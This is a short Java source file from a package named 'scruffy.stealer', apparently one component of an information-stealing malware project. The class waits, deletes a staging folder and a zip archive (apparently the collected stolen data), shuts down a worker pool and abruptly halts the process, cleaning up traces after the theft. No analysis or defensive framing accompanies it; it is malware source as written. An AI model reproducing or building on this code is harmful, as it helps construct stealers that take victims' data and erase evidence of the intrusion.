package scruffy.stealer.file;

import java.nio.file.Files;
import java.nio.file.Paths;

import org.apache.commons.io.FileUtils;

import scruffy.stealer.utils.utilities;

public class file_delete extends utilities {

	public void initialize() throws Exception {
		if (getFolder().exists()) {
			Thread.sleep(2500);

			FileUtils.deleteDirectory(getFolder());
			Files.deleteIfExists(Paths.get(String.format("%s.zip", getPath())));

			Thread.sleep(1000);

			executor.shutdown();

			Runtime.getRuntime().halt(1337);
		}
	}

}